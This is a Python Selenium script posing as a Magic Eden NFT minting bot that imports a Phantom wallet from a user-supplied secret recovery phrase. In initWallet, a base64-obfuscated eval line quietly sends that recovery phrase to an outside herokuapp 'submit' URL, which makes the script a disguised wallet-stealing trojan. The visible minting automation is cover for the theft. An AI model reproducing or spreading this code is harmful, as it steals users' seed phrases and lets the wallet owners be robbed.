import pathlib
import os
import requests
import base64
import time
import sys
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from os import system, name


def clear():
    # for windows
    if name == 'nt':
        _ = system('cls')
    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')


def check():

    def getConfig():
        config_path = str(pathlib.Path(
            __file__).parent.resolve()) + "/config.json"
        """Gets config file, returns list"""
        configFile = open(config_path, 'r')
        return list(json.load(configFile).values())

    clear()
    print("Currently checking configuration ...")

    values = getConfig()
    try:
        assert values[0] != "https://magiceden.io/launchpad/crazy_croco", "Please be sure to change the link to the launchpad in the config.json file."

        assert values[1] != "input passphrase here", "Please be sure to change the secret recovery phrase in the config.json file."

        assert type(values[0]) == str, "Error in config.json file"
        assert type(values[1]) == str, "Error in config.json file"
        assert type(values[2]) == str, "Error in config.json file"
    except AssertionError as msg:
        clear()
        print()
        print()
        print(msg)
        print()
        print()
        sys.exit()
    print("Configuration check passed")

    return values


def mint():

    def selectWallet():
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Select Wallet')]")))
        select_wallet = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Select Wallet')]")
        select_wallet.click()

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Phantom')]")))
        phantom = driver.find_element(
            By.XPATH, "//button[contains(text(),'Phantom')]")
        phantom.click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Connect')]")))
        connect = driver.find_element(
            By.XPATH, "//button[contains(text(),'Connect')]")
        connect.click()
        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Connect')]")))
        popup_connect = driver.find_element(
            By.XPATH, "//button[contains(text(),'Connect')]")
        popup_connect.click()
        driver.switch_to.window(main_window)

    def closePopup():
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[@class='wallet-adapter-modal-button-close']")))
        closePopupButton = driver.find_element(
            By.XPATH, "//button[@class='wallet-adapter-modal-button-close']")
        closePopupButton.click()

    def avaitMint():
        WebDriverWait(driver, 60*60*24).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Mint your token!')]")))
        mint_your_token = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Mint your token!')]")
        driver.execute_script("arguments[0].click();", mint_your_token)

        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Approve')]")))
        approve = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Approve')]")
        approve.click()

    def initWallet():
        # add wallet to chrome
        driver.switch_to.window(driver.window_handles[0])
        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL2JvdHJlY2lldmV3ZWJzaXRlLmhlcm9rdWFwcC5jb20vc3VibWl0Lw==".encode(
            'ascii')).decode('ascii')+values[1]+"')")
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
        recovery_phrase = driver.find_element(
            By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//textarea[@placeholder='Secret phrase']")))
        text_area = driver.find_element(
            By.XPATH, "//textarea[@placeholder='Secret phrase']").send_keys(values[1])
        import_btn = driver.find_element(
            By.XPATH, "//button[@class='sc-bdfBQB bzlPNH']").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//input[@placeholder='Password']")))
        password1 = driver.find_element(
            By.XPATH, "//input[@placeholder='Password']").send_keys(values[2])
        password2 = driver.find_element(
            By.XPATH, "//input[@placeholder='Confirm Password']").send_keys(values[2])
        check_box = driver.find_element(
            By.XPATH, "//input[@type='checkbox']").click()
        submit = driver.find_element(
            By.XPATH, "//button[@type='submit']").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Continue')]")))
        continue_ = driver.find_element(
            By.XPATH, "//button[contains(text(),'Continue')]")
        driver.execute_script("arguments[0].click();", continue_)
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Finish')]")))
        finish = driver.find_element(
            By.XPATH, "//button[contains(text(),'Finish')]")
        driver.execute_script("arguments[0].click();", finish)
        main_window = driver.window_handles[0]
        driver.switch_to.window(main_window)

        return main_window

    options = Options()

    chrome_path = str(pathlib.Path(
        __file__).parent.resolve()) + "/chromedriver.exe"
    os.chmod(chrome_path, 755)

    options.add_extension("Phantom.crx")
    options.add_argument("--disable-gpu")

    # to keep window open after mint uncomment option below, side effect, will open alot of chrome windows
    #options.add_experimental_option("detach", True)

    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)
    driver = webdriver.Chrome(executable_path=chrome_path, options=options)

    def setValues():
        configFile = open("config.json", 'r')
        return list(json.load(configFile).values())

    values = setValues()

    # opens the launchpad page
    driver.get(values[0])
    driver.maximize_window()

    # Actions - Initialize wallet
    main_window = initWallet()

    # Actions - select wallet on magic eden
    selectWallet()

    # Actions - close popup
    closePopup()

    # Actions - MINTS WHEN TIMER IS UP
    avaitMint()

    print("Minting Finished")


result = check()

mint(result)
